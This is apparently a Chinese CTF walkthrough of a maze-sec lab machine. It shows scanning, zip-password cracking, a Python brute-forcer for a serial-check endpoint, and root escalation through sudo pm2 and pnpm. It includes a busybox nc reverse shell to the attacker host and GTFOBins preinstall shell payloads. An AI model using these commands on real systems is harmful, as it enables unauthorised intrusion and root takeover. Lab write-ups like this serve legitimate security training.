
### 1. 基本信息

```
靶机链接：
https://maze-sec.com/library
```

```shell
难度：⭐️⭐️
知识点：信息收集，`hash`爆破，`pm2`提权，`npm`提权
```

### 2. 信息收集

### Nmap

```shell
└─# arp-scan -l | grep PCS
192.168.31.127  08:00:27:42:f3:c5       PCS Systemtechnik GmbH
└─# IP=192.168.31.127
└─# nmap -sV -sC -A $IP -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-07 08:32 CST
Nmap scan report for lingdong (192.168.31.127)
Host is up (0.0018s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0 (protocol 2.0)
8080/tcp open  http    Node.js Express framework
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: \xE5\xA4\xA7\xE5\x82\xBB\xE5\xAD\x90\xE5\xBA\x8F\xE5\x88\x97\xE5\x8F\xB7\xE9\xAA\x8C\xE8\xAF\x81\xE7\xB3\xBB\xE7\xBB\x9F
| http-robots.txt: 1 disallowed entry
|_zip2john 2026bak.zip > ziphash
MAC Address: 08:00:27:42:F3:C5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

开放了`22、8080`端口,先看看`web`有啥东西

### 3.目录扫描

```shell
└─# dirsearch -u http://$IP:8080  -x 403 -e txt,php,html
[08:33:55] 301 -  153B  - /css  ->  /css/
[08:33:58] 301 -  152B  - /js  ->  /js/
[08:34:03] 200 -  122B  - /robots.txt
```

有`robots.txt`,先习惯性看看内容

```shell
#http://192.168.31.127:8080/robots.txt
User-agent: QQGroupbot
Disallow: zip2john 2026bak.zip > ziphash
john --wordlist=/usr/share/wordlists/rockyou.txt ziphash
```

把`2026bak.zip`取下来

```shell
└─# wget http://192.168.31.127:8080/2026bak.zip
--2025-06-07 08:41:05--  http://192.168.31.127:8080/2026bak.zip
正在连接 192.168.31.127:8080... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：676250 (660K) [application/zip]
正在保存至: “2026bak.zip”

2026bak.zip                   100%[=================================================>] 660.40K  --.-KB/s  用时 0.1s

2025-06-07 08:41:06 (5.04 MB/s) - 已保存 “2026bak.zip” [676250/676250])
┌──(root㉿LAPTOP-FAMILY)-[/tmp]
└─# zip2john 2026bak.zip > ziphash
└─# john --wordlist=/usr/share/wordlists/rockyou.txt ziphash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 24 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123456789        (2026bak.zip)
1g 0:00:00:00 DONE (2025-06-07 08:42) 25.00g/s 1228Kp/s 1228Kc/s 1228KC/s 123456..trudy
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

根据提示爆破压缩包密码为`123456789`，解压后是网页的源码

### 4.获得`welcome`权限

没读取源码的备份也不影响，直接访问页面是一个`序列号验证`页面，看源码有加密逻辑，把已知信息丢给`AI`让写个脚本爆破正确序列号，丢给ai的内容

```shell
已知网页源码如下，编写python脚本，爆破正确序列号:
#index.js
document.addEventListener('DOMContentLoaded', function () {
    const snInput = document.getElementById('sn-input');
    const verifyBtn = document.getElementById('verify-btn');
    const responseText = document.getElementById('response-text');
    const statusIcon = document.getElementById('status-icon');
    function cleanInput(value) {
        return value.replace(/[^a-zA-Z0-9]/g, '').toUpperCase();
    }
    function formatSerialNumber(value) {
        let cleanValue = cleanInput(value);
        let formatted = '';
        for (let i = 0; i < cleanValue.length; i++) {
            if (i > 0 && i % 5 === 0) {
                formatted += '-';
            }
            formatted += cleanValue[i];
        }
        return formatted;
    }
    snInput.addEventListener('input', function () {
        const startPos = snInput.selectionStart;
        const formattedValue = formatSerialNumber(snInput.value);
        snInput.value = formattedValue;
        let newPos = startPos;
        if (startPos === 6 || startPos === 12 || startPos === 18 || startPos === 24) {
            newPos = startPos + 1;
        }
        snInput.setSelectionRange(newPos, newPos);
    });
    snInput.addEventListener('keypress', function (e) {
        if (e.key === 'Enter') {
            verifySerialNumber();
        }
    });

    verifyBtn.addEventListener('click', verifySerialNumber);
    function verifySerialNumber() {
        const serialNumber = cleanInput(snInput.value);
        statusIcon.className = 'status-icon pending';
        statusIcon.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i>';
        responseText.textContent = "验证中，请稍候...";
        if (serialNumber.length !== 25) {
            statusIcon.className = 'status-icon error';
            statusIcon.innerHTML = '<i class="fas fa-exclamation-triangle"></i>';
            responseText.textContent = '错误: 序列号长度不正确 (需要25个字符)';
            return;
        }
        let hashSN = CreatehashSN(snInput.value);
        // console.log("hashSN:", hashSN);

        setTimeout(function () {
            fetch('/checkSN', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ sn: hashSN })
            })
                .then(response => response.json())
                .then(data => {
                    console.log("checkSN response:", data);
                    if (data.code === 200) {
                        statusIcon.className = 'status-icon success';
                        statusIcon.innerHTML = '<i class="fas fa-check-circle"></i>';
                        responseText.innerHTML = `序列号 <strong>${snInput.value}</strong> <br>验证成功！<br> ${data.data}`;
                    }
                    else {
                        statusIcon.className = 'status-icon error';
                        statusIcon.innerHTML = '<i class="fas fa-times-circle"></i>';
                        responseText.innerHTML = `序列号 <strong>${snInput.value}</strong> 验证失败！<br>状态: 无效或已被使用`;
                    }
                });
        }, 300);
    }
});

// 随机数生成函数（使用Math.seedrandom）
function R(seed, min = 100, max = 200) {
    // const rng = new Math.seedrandom(seed);
    // // return Math.floor(rng() * (max - min + 1)) + min;
    // return Math.floor((max - min + 1)) + min;
    return seed + min + max;
}
function CreatehashSN(SN) {
    // if(SN.length!== 29)
    // {
    //     return "序列号长度不正确 (需要25个字符)";
    // }
    console.log("SN", SN);
    const VI = "Jkdsfojweflk0024564555*";
    const KEY = "6K+35LiN6KaB5bCd6K+V5pq05Yqb56C06Kej77yM5LuU57uG55yL55yL5Yqg5a+G5rqQ5Luj56CB44CC";

    let a = [];
    let b = [];
    let e = [];
    let f = [];
    let z = [];

    // 处理SN字符串
    for (let i = 0; i < SN.length; i++) {
        const charCode = SN.charCodeAt(i);

        if (i >= 0 && i <= 4) {
            a.push(R(charCode));
            b.push(R(charCode));
            e.push(R(charCode));
            f.push(R(charCode));
            z.push(R(charCode));
        }
        if (i >= 5 && i <= 9) {
            b.push(R(charCode));
            e.push(R(charCode));
            f.push(R(charCode));
            z.push(R(charCode));
        }
        if (i >= 10 && i <= 14) {
            e.push(R(charCode));
            f.push(R(charCode));
            z.push(R(charCode));
        }
        if (i >= 15 && i <= 19) {
            f.push(R(charCode));
            z.push(R(charCode));
        }
        if (i >= 20 && i <= 24) {
            z.push(R(charCode));
        }
    }
    // console.log("a", a);
    // console.log("b", b);
    // console.log("e", e);
    // console.log("f", f);
    // console.log("z", z);
    // e = Math.max(f, g);
    if (a[0] > a[2] || a[1] > a[3]) {
        a[0] = Math.max(a[0], a[1], a[2], a[3], a[4]);
    } else {
        a[0] = Math.min(a[0], a[1], a[2], a[3], a[4]);
    }
    if (b[4] > b[6]) {
        b[0] = Math.max(b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]);
    } else {
        b[0] = Math.min(b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]);
    }
    if (e[8] > e[10] || e[9] > e[11]) {
        e[0] = Math.max(e[0], e[1], e[2], e[3], e[4], e[5], e[6], e[7], e[8], e[9], e[10], e[11]);
    } else {
        e[0] = Math.min(e[0], e[1], e[2], e[3], e[4], e[5], e[6], e[7], e[8], e[9], e[10], e[11]);
    }
    if (f[0] > f[10]) {
        f[0] = Math.max(f[0], f[1], f[2], f[3], f[4], f[5], f[6], f[7], f[8], f[9], f[10], f[11], f[12], f[13], f[14], f[15], f[16], f[17], f[18], f[19]);
    } else {
        f[0] = Math.min(f[0], f[1], f[2], f[3], f[4], f[5], f[6], f[7], f[8], f[9], f[10], f[11], f[12], f[13], f[14], f[15], f[16], f[17], f[18], f[19]);
    }
    if (z[15] > z[17] || z[18] > z[24]) {
        z[0] = Math.max(z[0], z[1], z[2], z[3], z[4], z[5], z[6], z[7], z[8], z[9], z[10], z[11], z[12], z[13], z[14], z[15], z[16], z[17], z[18], z[19], z[20], z[21], z[22], z[23], z[24]);
    } else {
        z[0] = Math.min(z[0], z[1], z[2], z[3], z[4], z[5], z[6], z[7], z[8], z[9], z[10], z[11], z[12], z[13], z[14], z[15], z[16], z[17], z[18], z[19], z[20], z[21], z[22], z[23], z[24]);
    }
    // console.log("a[0]", a[0]);
    // console.log("b[0]", b[0]);
    // console.log("e[0]", e[0]);
    // console.log("f[0]", f[0]);
    // console.log("z[0]", z[0]);
    let sum = 0;
    for (let i = 0; i < a.length; i++) {
        sum += a[i]
    }
    // console.log("sum", sum);
    a[0] = (sum ^ a[0]) % 12;
    a[0] = KEY.charAt(a[0]);

    for (let i = 0; i < b.length; i++) {
        sum += b[i]
    }
    // console.log("sum", sum);
    b[0] = (sum ^ b[0]) % 9;
    b[0] = KEY.charAt(b[0]);

    for (let i = 0; i < e.length; i++) {
        sum += e[i]
    }
    // console.log("sum", sum);

    e[0] = (sum ^ e[0]) % 8;
    e[0] = KEY.charAt(e[0]);


    for (let i = 0; i < f.length; i++) {
        sum += f[i]
    }
    // console.log("sum", sum);
    f[0] = (sum ^ f[0]) % 7;
    f[0] = KEY.charAt(f[0]);

    for (let i = 0; i < z.length; i++) {
        sum += z[i]
    }
    // console.log("sum", sum);
    z[0] = (sum ^ z[0]) % 6;
    z[0] = VI.charAt(z[0]);

    // console.log("a[0]", a[0]);
    // console.log("b[0]", b[0]);
    // console.log("e[0]", e[0]);
    // console.log("f[0]", f[0]);
    // console.log("z[0]", z[0]);
    let hashSN = md5(a[0] + b[0] + e[0] + f[0] + z[0]);
    // console.log("hashSN", hashSN);
    return hashSN;
}

#md5.min.js
!function(n){"use strict";function d(n,t){var r=(65535&n)+(65535&t);return(n>>16)+(t>>16)+(r>>16)<<16|65535&r}function f(n,t,r,e,o,u){return d((c=d(d(t,n),d(e,u)))<<(f=o)|c>>>32-f,r);var c,f}function l(n,t,r,e,o,u,c){return f(t&r|~t&e,n,t,o,u,c)}function v(n,t,r,e,o,u,c){return f(t&e|r&~e,n,t,o,u,c)}function g(n,t,r,e,o,u,c){return f(t^r^e,n,t,o,u,c)}function m(n,t,r,e,o,u,c){return f(r^(t|~e),n,t,o,u,c)}function i(n,t){var r,e,o,u;n[t>>5]|=128<<t%32,n[14+(t+64>>>9<<4)]=t;for(var c=1732584193,f=-271733879,i=-1732584194,a=271733878,h=0;h<n.length;h+=16)c=l(r=c,e=f,o=i,u=a,n[h],7,-680876936),a=l(a,c,f,i,n[h+1],12,-389564586),i=l(i,a,c,f,n[h+2],17,606105819),f=l(f,i,a,c,n[h+3],22,-1044525330),c=l(c,f,i,a,n[h+4],7,-176418897),a=l(a,c,f,i,n[h+5],12,1200080426),i=l(i,a,c,f,n[h+6],17,-1473231341),f=l(f,i,a,c,n[h+7],22,-45705983),c=l(c,f,i,a,n[h+8],7,1770035416),a=l(a,c,f,i,n[h+9],12,-1958414417),i=l(i,a,c,f,n[h+10],17,-42063),f=l(f,i,a,c,n[h+11],22,-1990404162),c=l(c,f,i,a,n[h+12],7,1804603682),a=l(a,c,f,i,n[h+13],12,-40341101),i=l(i,a,c,f,n[h+14],17,-1502002290),c=v(c,f=l(f,i,a,c,n[h+15],22,1236535329),i,a,n[h+1],5,-165796510),a=v(a,c,f,i,n[h+6],9,-1069501632),i=v(i,a,c,f,n[h+11],14,643717713),f=v(f,i,a,c,n[h],20,-373897302),c=v(c,f,i,a,n[h+5],5,-701558691),a=v(a,c,f,i,n[h+10],9,38016083),i=v(i,a,c,f,n[h+15],14,-660478335),f=v(f,i,a,c,n[h+4],20,-405537848),c=v(c,f,i,a,n[h+9],5,568446438),a=v(a,c,f,i,n[h+14],9,-1019803690),i=v(i,a,c,f,n[h+3],14,-187363961),f=v(f,i,a,c,n[h+8],20,1163531501),c=v(c,f,i,a,n[h+13],5,-1444681467),a=v(a,c,f,i,n[h+2],9,-51403784),i=v(i,a,c,f,n[h+7],14,1735328473),c=g(c,f=v(f,i,a,c,n[h+12],20,-1926607734),i,a,n[h+5],4,-378558),a=g(a,c,f,i,n[h+8],11,-2022574463),i=g(i,a,c,f,n[h+11],16,1839030562),f=g(f,i,a,c,n[h+14],23,-35309556),c=g(c,f,i,a,n[h+1],4,-1530992060),a=g(a,c,f,i,n[h+4],11,1272893353),i=g(i,a,c,f,n[h+7],16,-155497632),f=g(f,i,a,c,n[h+10],23,-1094730640),c=g(c,f,i,a,n[h+13],4,681279174),a=g(a,c,f,i,n[h],11,-358537222),i=g(i,a,c,f,n[h+3],16,-722521979),f=g(f,i,a,c,n[h+6],23,76029189),c=g(c,f,i,a,n[h+9],4,-640364487),a=g(a,c,f,i,n[h+12],11,-421815835),i=g(i,a,c,f,n[h+15],16,530742520),c=m(c,f=g(f,i,a,c,n[h+2],23,-995338651),i,a,n[h],6,-198630844),a=m(a,c,f,i,n[h+7],10,1126891415),i=m(i,a,c,f,n[h+14],15,-1416354905),f=m(f,i,a,c,n[h+5],21,-57434055),c=m(c,f,i,a,n[h+12],6,1700485571),a=m(a,c,f,i,n[h+3],10,-1894986606),i=m(i,a,c,f,n[h+10],15,-1051523),f=m(f,i,a,c,n[h+1],21,-2054922799),c=m(c,f,i,a,n[h+8],6,1873313359),a=m(a,c,f,i,n[h+15],10,-30611744),i=m(i,a,c,f,n[h+6],15,-1560198380),f=m(f,i,a,c,n[h+13],21,1309151649),c=m(c,f,i,a,n[h+4],6,-145523070),a=m(a,c,f,i,n[h+11],10,-1120210379),i=m(i,a,c,f,n[h+2],15,718787259),f=m(f,i,a,c,n[h+9],21,-343485551),c=d(c,r),f=d(f,e),i=d(i,o),a=d(a,u);return[c,f,i,a]}function a(n){for(var t="",r=32*n.length,e=0;e<r;e+=8)t+=String.fromCharCode(n[e>>5]>>>e%32&255);return t}function h(n){var t=[];for(t[(n.length>>2)-1]=void 0,e=0;e<t.length;e+=1)t[e]=0;for(var r=8*n.length,e=0;e<r;e+=8)t[e>>5]|=(255&n.charCodeAt(e/8))<<e%32;return t}function e(n){for(var t,r="0123456789abcdef",e="",o=0;o<n.length;o+=1)t=n.charCodeAt(o),e+=r.charAt(t>>>4&15)+r.charAt(15&t);return e}function r(n){return unescape(encodeURIComponent(n))}function o(n){return a(i(h(t=r(n)),8*t.length));var t}function u(n,t){return function(n,t){var r,e,o=h(n),u=[],c=[];for(u[15]=c[15]=void 0,16<o.length&&(o=i(o,8*n.length)),r=0;r<16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(h(t)),512+8*t.length),a(i(c.concat(e),640))}(r(n),r(t))}function t(n,t,r){return t?r?u(t,n):e(u(t,n)):r?o(n):e(o(n))}"function"==typeof define&&define.amd?define(function(){return t}):"object"==typeof module&&module.exports?module.exports=t:n.md5=t}(this);
//# sourceMappingURL=md5.min.js.map

#seedrandom.min.js
!function(f,a,c){var s,l=256,p="random",d=c.pow(l,6),g=c.pow(2,52),y=2*g,h=l-1;function n(n,t,r){function e(){for(var n=u.g(6),t=d,r=0;n<g;)n=(n+r)*l,t*=l,r=u.g(1);for(;y<=n;)n/=2,t/=2,r>>>=1;return(n+r)/t}var o=[],i=j(function n(t,r){var e,o=[],i=typeof t;if(r&&"object"==i)for(e in t)try{o.push(n(t[e],r-1))}catch(n){}return o.length?o:"string"==i?t:t+"\0"}((t=1==t?{entropy:!0}:t||{}).entropy?[n,S(a)]:null==n?function(){try{var n;return s&&(n=s.randomBytes)?n=n(l):(n=new Uint8Array(l),(f.crypto||f.msCrypto).getRandomValues(n)),S(n)}catch(n){var t=f.navigator,r=t&&t.plugins;return[+new Date,f,r,f.screen,S(a)]}}():n,3),o),u=new m(o);return e.int32=function(){return 0|u.g(4)},e.quick=function(){return u.g(4)/4294967296},e.double=e,j(S(u.S),a),(t.pass||r||function(n,t,r,e){return e&&(e.S&&v(e,u),n.state=function(){return v(u,{})}),r?(c[p]=n,t):n})(e,i,"global"in t?t.global:this==c,t.state)}function m(n){var t,r=n.length,u=this,e=0,o=u.i=u.j=0,i=u.S=[];for(r||(n=[r++]);e<l;)i[e]=e++;for(e=0;e<l;e++)i[e]=i[o=h&o+n[e%r]+(t=i[e])],i[o]=t;(u.g=function(n){for(var t,r=0,e=u.i,o=u.j,i=u.S;n--;)t=i[e=h&e+1],r=r*l+i[h&(i[e]=i[o=h&o+t])+(i[o]=t)];return u.i=e,u.j=o,r})(l)}function v(n,t){return t.i=n.i,t.j=n.j,t.S=n.S.slice(),t}function j(n,t){for(var r,e=n+"",o=0;o<e.length;)t[h&o]=h&(r^=19*t[h&o])+e.charCodeAt(o++);return S(t)}function S(n){return String.fromCharCode.apply(0,n)}if(j(c.random(),a),"object"==typeof module&&module.exports){module.exports=n;try{s=require("crypto")}catch(n){}}else"function"==typeof define&&define.amd?define(function(){return n}):c["seed"+p]=n}("undefined"!=typeof self?self:this,[],Math);

#index.html
<!DOCTYPE html>
<html lang="zh-CN">

<body>
    <div class="container">
        <div class="header">
            <h1><i class="fas fa-key"></i> 序列号验证</h1>
            <div class="subtitle">验证您的产品序列号</div>
        </div>

        <div class="form-container">
            <div class="input-container">
                <label class="serial-label">序列号</label>
                <input type="text" id="sn-input" class="sn-input" placeholder="DPKU9-8APJ9-8XZJ0-8XZ08-7H111"
                    maxlength="29">
                <div class="format-hint">格式：XXXXX-XXXXX-XXXXX-XXXXX-XXXXX</div>
            </div>

            <button id="verify-btn" class="submit-btn">
                <i class="fas fa-check-circle"></i> 验证序列号
            </button>
        </div>

        <div class="response-container">
            <div id="status-icon" class="status-icon pending">
                <i class="fas fa-fingerprint"></i>
            </div>
            <div class="response-title">验证状态</div>
            <div id="response-text">等待验证序列号...</div>
        </div>

        <div class="instructions">
            <p><strong>使用指南：</strong></p>
            <ul>
                <li>序列号格式为5组5个字符（字母和数字），每组用连字符分隔</li>
                <li>输入时系统会自动添加连字符</li>
                <li>示例：<code>DPKU9-8APJ9-8XZJ0-8XZ08-7H111</code></li>
                <li>点击"验证序列号"按钮或按<kbd class="keyboard-shortcut">Enter</kbd>提交验证</li>
            </ul>
        </div>

        <div class="footer">
            © 2026 大傻子序列号验证系统 | 安全可靠
        </div>
    </div>
    <script src="js/md5.min.js"></script>
    <script src="/js/index.js"></script>
</body>

</html>
完善python脚本，测试序列号为：DPKU9-8APJ9-8XZJ0-8XZ08-7H111，burp抓包如下：
POST /checkSN HTTP/1.1
Host: 192.168.31.127:8080
Content-Length: 41
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://192.168.31.127:8080
Referer: http://192.168.31.127:8080/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"sn":"fff6b1d8405256ad9176e19bf2779969"}
```

编写的 `python`脚本如下

##### ` 爆破hash`

```shell
import requests
import hashlib
import sys
import time

# 目标URL和已知信息
TARGET_URL = "http://192.168.31.127:8080/checkSN"  # 根据抓包信息设置目标URL
KNOWN_HASH = "fff6b1d8405256ad9176e19bf2779969"  # 测试序列号的已知hash
KEY = "6K+35LiN6KaB5bCd6K+V5pq05Yqb56C06Kej77yM5LuU57uG55yL55yL5Yqg5a+G5rqQ5Luj56CB44CC"
VI = "Jkdsfojweflk0024564555*"


def calculate_hashsn(c1, c2, c3, c4, c5):
    """计算5个字符组合的MD5值"""
    combined = c1 + c2 + c3 + c4 + c5
    return hashlib.md5(combined.encode()).hexdigest()


def verify_test_combination():
    """验证测试序列号的组合是否有效"""
    print("[*] 验证测试序列号组合...")
    # 测试序列号的5字符组合（需要逆向推导）
    test_combinations = [
        ('6', 'K', '+', '3', 'J'),
        ('6', 'K', '+', '3', 'k'),
        ('6', 'K', '+', '3', 'd')
    ]

    for i, combo in enumerate(test_combinations):
        c1, c2, c3, c4, c5 = combo
        hashsn = calculate_hashsn(c1, c2, c3, c4, c5)

        if hashsn == KNOWN_HASH:
            print(f"[+] 测试序列号组合验证成功: {combo} -> {hashsn}")
            return combo

    print("[-] 未找到匹配的测试序列号组合")
    return None


def brute_force_sn():
    """爆破所有可能的字符组合"""
    total_combinations = 12 * 9 * 8 * 7 * 6
    count = 0
    start_time = time.time()
    found_test = False
    test_combo = None

    print("[*] 开始爆破序列号验证凭证...")
    print(f"[*] 总组合数: {total_combinations}")

    # 枚举所有可能的字符组合
    for c1 in KEY[:12]:
        for c2 in KEY[:9]:
            for c3 in KEY[:8]:
                for c4 in KEY[:7]:
                    for c5 in VI[:6]:
                        count += 1
                        combo = (c1, c2, c3, c4, c5)
                        hashsn = calculate_hashsn(*combo)

                        # 检查是否匹配测试序列号
                        if not found_test and hashsn == KNOWN_HASH:
                            print(f"\n[+] 找到测试序列号组合: {combo}")
                            test_combo = combo
                            found_test = True

                        # 发送验证请求
                        payload = {"sn": hashsn}
                        try:
                            response = requests.post(TARGET_URL, json=payload, timeout=5)
                            if response.status_code == 200:
                                data = response.json()
                                if data.get('code') == 200:
                                    elapsed = time.time() - start_time
                                    print(f"\n\n[+] 爆破成功! 用时: {elapsed:.2f}秒")
                                    print(f"[+] 有效组合: {c1}{c2}{c3}{c4}{c5}")
                                    print(f"[+] 凭证hash: {hashsn}")
                                    print(f"[+] 服务器响应: {data.get('data', '')}")
                                    return
                        except (requests.RequestException, requests.Timeout):
                            continue

                        # 进度显示
                        if count % 100 == 0 or count == total_combinations:
                            elapsed = time.time() - start_time
                            rate = count / elapsed if elapsed > 0 else 0
                            percent = (count / total_combinations) * 100
                            remaining = (total_combinations - count) / rate if rate > 0 else 0

                            sys.stdout.write(
                                f"\r进度: {percent:.2f}% | "
                                f"已完成: {count}/{total_combinations} | "
                                f"速度: {rate:.1f}组合/秒 | "
                                f"预计剩余: {remaining:.1f}秒"
                            )
                            sys.stdout.flush()

    print("\n\n[-] 爆破完成，未找到有效凭证")
    if found_test:
        print(f"[+] 测试序列号组合存在: {test_combo}")
    else:
        print("[-] 未找到测试序列号组合")


if __name__ == "__main__":
    # 首先验证测试序列号组合
    test_combo = verify_test_combination()

    # 执行爆破
    brute_force_sn()

    print("\n[*] 脚本执行结束")
```

很快就有运行结果

```shell
[*] 验证测试序列号组合...
[-] 未找到匹配的测试序列号组合
[*] 开始爆破序列号验证凭证...
[*] 总组合数: 36288
进度: 2.76% | 已完成: 1000/36288 | 速度: 72.9组合/秒 | 预计剩余: 483.9秒

[+] 爆破成功! 用时: 14.13秒
[+] 有效组合: 6365d
[+] 凭证hash: ee5a82db0f9bf1c1903821477e11c067
[+] 服务器响应: welcome:DPKU9-8APJ9-8XZJ0-8XZ08-7H111

[*] 脚本执行结束
```

拿到`ssh`的账号密码信息`welcome:DPKU9-8APJ9-8XZJ0-8XZ08-7H111`，好熟悉的密码，就是页面序列号的示例

### 5.获得`welcome`权限

 测试直接用`welcome:DPKU9-8APJ9-8XZJ0-8XZ08-7H111`成功`ssh`登陆靶机

```shell
└─# welcome:DPKU9-8APJ9-8XZJ0-8XZ08-7H111
└─# ssh welcome@192.168.31.127
welcome@192.168.31.127's password:#welcome:DPKU9-8APJ9-8XZJ0-8XZ08-7H111
=============================
Welcome!!!
QQ Group:660930334
=============================
lingdong:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
lingdong:~$ cd
lingdong:~$ ls
user.txt

```

##### 拿到`user.txt`

```
lingdong:~$ cat user.txt
flag{user-afc8b494c5ba167971f10274f5a81534}
lingdong:~$
```



### 6.获得`root`权限

`sudo`发现所有用户能够以 `root `身份运行 `/root/.local/share/pnpm/global-bin/pm2`和`/usr/bin/pnpm`

```shell
lingdong:/tmp$ sudo -l
Matching Defaults entries for welcome on lingdong:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for welcome:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User welcome may run the following commands on lingdong:
    (ALL : ALL) NOPASSWD: /root/.local/share/pnpm/global-bin/pm2
    (ALL : ALL) NOPASSWD: /usr/bin/pnpm
```

先`-h`看看使用说明，两个都可以提权

##### 方法1：`pm2`提权

```shell
└─# tldr pm2
Node.js 的进程管理工具。
用于日志管理、监控和配置进程。
更多信息：https://pm2.keymetrics.io.
#pm2 start app.js --name 应用名称
 - 启动一个进程并指定名称，以便后续操作使用：
#pm2 list
 - 列出所有进程：
#pm2 delete|del <名称|ID|命名空间|脚本|all|json|stdin...>
 - 停止并从 PM2 进程列表中删除进程
#pm2 --interpreter <解释器>
 - 设置执行应用的解释器（默认：node）
#pm2 start [选项] [名称|命名空间|文件|环境|ID...]
 - 启动并守护应用
......
```

直接通过 `PM2` 的`start`参数执行命令,先直接读`root.txt`文件

```shell
lingdong:/tmp$ # 创建读取脚本
lingdong:/tmp$ echo '#!/bin/sh
> cat /root/root.txt > /tmp/root_content 2>&1
> ' > /tmp/read_root.sh
lingdong:/tmp$ chmod +x /tmp/read_root.sh
lingdong:/tmp$ ls
read_root.sh
lingdong:/tmp$ sudo /root/.local/share/pnpm/global-bin/pm2 start /tmp/read_root.sh --interpreter=/bin/sh -f
[PM2] Starting /tmp/read_root.sh in fork_mode (1 instance)
[PM2] Done.
┌────┬────────────────────┬──────────┬──────┬───────────┬──────────┬──────────┐
│ id │ name               │ mode     │ ↺    │ status    │ cpu      │ memory   │
├────┼────────────────────┼──────────┼──────┼───────────┼──────────┼──────────┤
│ 1  │ read_root          │ fork     │ 0    │ stopped   │ 0%       │ 0b       │
│ 0  │ test               │ fork     │ 15   │ errored   │ 0%       │ 0b       │
└────┴────────────────────┴──────────┴──────┴───────────┴──────────┴──────────┘
lingdong:/tmp$ cat /tmp/root_content
flag{root-b89ed76b27e91ad5d773ddadae256072}
lingdong:/tmp$
```

能读文件,试试反弹`shell`，注意，靶机只有`sh`且软连接到`busybox`

```shell
lingdong:/tmp$ ls -l /bin/sh
lrwxrwxrwx    1 root     root            12 Jun  3 08:13 /bin/sh -> /bin/busybox
lingdong:/tmp$ cat read_root.sh
#!/bin/sh
busybox nc 192.168.31.126 1234 -e /bin/sh
lingdong:/tmp$ sudo /root/.local/share/pnpm/global-bin/pm2 start /tmp/read_root.sh --interpreter=/bin/sh -f
[PM2] Applying action restartProcessId on app [read_root](ids: [ 0 ])
[PM2] [read_root](0) ✓
[PM2] Process successfully started
┌────┬────────────────────┬──────────┬──────┬───────────┬──────────┬──────────┐
│ id │ name               │ mode     │ ↺    │ status    │ cpu      │ memory   │
├────┼────────────────────┼──────────┼──────┼───────────┼──────────┼──────────┤
│ 0  │ read_root          │ fork     │ 15   │ online    │ 0%       │ 892.0kb  │
└────┴────────────────────┴──────────┴──────┴───────────┴──────────┴──────────┘
lingdong:/tmp$
kali# nc -lvp 1234
listening on [any] 1234 ...
id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
cd
cat ro*
flag{root-b89ed76b27e91ad5d773ddadae256072}
```

找到 `root.txt` 为` flag{root-b89ed76b27e91ad5d773ddadae256072}`



##### 方法2：`pnpm`提权

查阅[[GTFOBins](https://gtfobins.github.io/)](https://gtfobins.github.io/)参照`npm`现成方案

```shell
TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
sudo npm -C $TF --unsafe-perm i
#创建临时目录 TF=$(mktemp -d)
#植入恶意脚本echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
payload 结构：
{
  "scripts": {
    "preinstall": "/bin/sh"  // 关键提权点
  }
}
攻击原理：
npm 在安装包时自动执行 preinstall 生命周期脚本。
此处将 /bin/sh 定义为预安装脚本，触发时直接启动交互式 shell。
#触发特权执行sudo npm -C $TF --unsafe-perm i
-C $TF,指定工作目录为临时目录,强制加载恶意 package.json
--unsafe-perm,强制保留root权限执行脚本，使/bin/sh获得root shell
i,触发安装命令,执行preinstall脚本
```

成功提权

```shell
lingdong:/tmp$ TF=$(mktemp -d)
lingdong:/tmp$ echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
lingdong:/tmp$  sudo /usr/bin/pnpm -C $TF --unsafe-perm i
Already up to date

> @ preinstall /tmp/tmp.GemLlH
> /bin/sh

/tmp/tmp.GemLlH # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```



##### 方法3：`pnpm`优雅提权

查阅[[GTFOBins](https://gtfobins.github.io/)](https://gtfobins.github.io/)参照`npm`现成方案（`pnpm`就是更牛逼的`npm`，用`tldr`看用法都一样），运行`sudo pnpm exec /bin/sh`直接提权

```shell
lingdong:/tmp$ sudo pnpm exec /bin/sh
 ERR_PNPM_RECURSIVE_EXEC_NO_PACKAGE  No package found in this workspace
lingdong:/tmp$ find -name package.json 2>/dev/null
./tmp.GemLlH/package.json
lingdong:/tmp$ cd ./tmp.GemLlH/
lingdong:/tmp/tmp.GemLlH$ ll
total 8
-rw-r--r--    1 welcome  welcome         39 Jun  7 11:17 package.json
drwxrwxrwt    6 root     root           280 Jun  7 11:17 ..
-rw-r--r--    1 root     root           114 Jun  7 11:17 pnpm-lock.yaml
drwxr-xr-x    2 root     root            60 Jun  7 11:21 node_modules
drwx------    3 welcome  welcome        100 Jun  7 11:21 .
lingdong:/tmp/tmp.GemLlH$ sudo pnpm exec /bin/sh
/tmp/tmp.GemLlH # id
